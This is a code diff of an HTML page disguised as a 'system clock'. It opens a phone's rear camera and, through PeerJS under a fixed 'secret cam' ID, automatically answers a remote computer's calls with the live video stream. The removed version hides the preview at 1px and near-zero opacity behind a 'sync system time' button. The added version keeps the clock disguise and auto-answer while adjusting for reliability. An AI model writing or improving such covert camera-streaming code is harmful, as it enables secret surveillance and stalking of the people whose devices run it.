@@ -6,69 +6,78 @@
     <title>系统时钟</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #333; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        #clock { font-size: 4rem; color: #004400; text-shadow: 0 0 10px #002200; }
-        #btn-start { padding: 15px 30px; font-size: 1.2rem; background: #111; color: #006600; border: 1px solid #004400; border-radius: 5px; cursor: pointer; z-index: 100; }
-        #video-preview { width: 1px; height: 1px; opacity: 0.01; }
-        .info { font-size: 0.8rem; margin-top: 20px; color: #222; }
+        body { background: #000; color: #004400; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        #clock { font-size: 3rem; margin-bottom: 20px; }
+        /* 调试窗口：为了确保成功，我们先让画面在手机上露出来 */
+        #localVideo { 
+            width: 160px; height: 120px; border: 1px solid #111; 
+            background: #050505; object-fit: cover;
+        }
+        #start-btn { 
+            padding: 20px 40px; font-size: 1.2rem; background: #002200; 
+            color: #00ff00; border: 1px solid #00ff00; border-radius: 10px; cursor: pointer;
+        }
+        #status { margin-top: 10px; font-size: 0.8rem; }
     </style>
 </head>
 <body>
 
-    <button id="btn-start" onclick="initSystem()">点击同步系统时间</button>
+    <button id="start-btn" onclick="startSystem()">[ 激活系统监控 ]</button>
     
     <div id="clock" style="display:none;">00:00:00</div>
     
-    <video id="video-preview" autoplay playsinline muted></video>
+    <video id="localVideo" autoplay playsinline muted></video>
 
-    <div class="info" id="status">DEVICE_ID: OFFLINE</div>
+    <div id="status">等待激活...</div>
 
     <script>
-        /*************************************************
-         * 重要配置：必须与电脑端的 targetPhoneId 一致
-         *************************************************/
-        const myID = 'my_secret_cam_9988'; 
+        const myID = 'my_secret_cam_9988'; // 必须与电脑端一致
 
-        function initSystem() {
-            // 1. 隐藏按钮，显示时钟
-            document.getElementById('btn-start').style.display = 'none';
-            document.getElementById('clock').style.display = 'block';
-            document.getElementById('status').innerText = "DEVICE_ID: " + myID;
+        function startSystem() {
+            const statusTag = document.getElementById('status');
+            const btn = document.getElementById('start-btn');
+            const clock = document.getElementById('clock');
+            const videoElement = document.getElementById('localVideo');
 
-            // 2. 开启时钟循环
-            setInterval(() => {
-                const now = new Date();
-                document.getElementById('clock').innerText = now.toTimeString().split(' ')[0];
-            }, 1000);
+            btn.style.display = 'none';
+            clock.style.display = 'block';
+            statusTag.innerText = "正在获取摄像头权限...";
 
-            // 3. 启动摄像头
+            // 1. 获取摄像头（最通用的配置）
             navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" }, // 优先使用后置摄像头
+                video: { facingMode: "environment" }, // 优先后置
                 audio: false 
-            }).then(stream => {
-                document.getElementById('video-preview').srcObject = stream;
-                
-                // 4. 初始化 PeerJS
+            })
+            .then(stream => {
+                // 2. 关键：先让手机自己显示画面
+                videoElement.srcObject = stream;
+                videoElement.play();
+                statusTag.innerText = "摄像头已就绪，正在连接服务器...";
+
+                // 3. 初始化 PeerJS
                 const peer = new Peer(myID);
 
                 peer.on('open', (id) => {
-                    console.log('手机端已就绪，ID:', id);
-                    document.getElementById('status').style.color = "#006600";
-                    document.getElementById('status').innerText = "DEVICE_ID: ONLINE";
+                    statusTag.innerText = "系统在线 (ID: " + id + ")";
+                    statusTag.style.color = "#00ff00";
                 });
 
-                // 5. 自动应答电脑端的呼叫
+                // 4. 重要修复：当电脑呼叫时，确保把正在运行的 stream 传过去
                 peer.on('call', (call) => {
-                    console.log('接收到监控端请求...');
-                    call.answer(stream); // 将摄像头流发给电脑
+                    console.log("接收到电脑端呼叫...");
+                    call.answer(stream); 
                 });
 
-                peer.on('error', (err) => {
-                    alert("错误: " + err.type + "\n请刷新重试。可能是 ID 被占用了，请修改代码中的 myID");
-                });
+                // 启动时钟循环
+                setInterval(() => {
+                    clock.innerText = new Date().toLocaleTimeString();
+                }, 1000);
 
-            }).catch(err => {
-                alert("无法访问摄像头: " + err.name);
+            })
+            .catch(err => {
+                statusTag.innerText = "权限失败: " + err.name;
+                console.error(err);
+                alert("请在浏览器设置中允许摄像头权限！");
             });
         }
     </script>
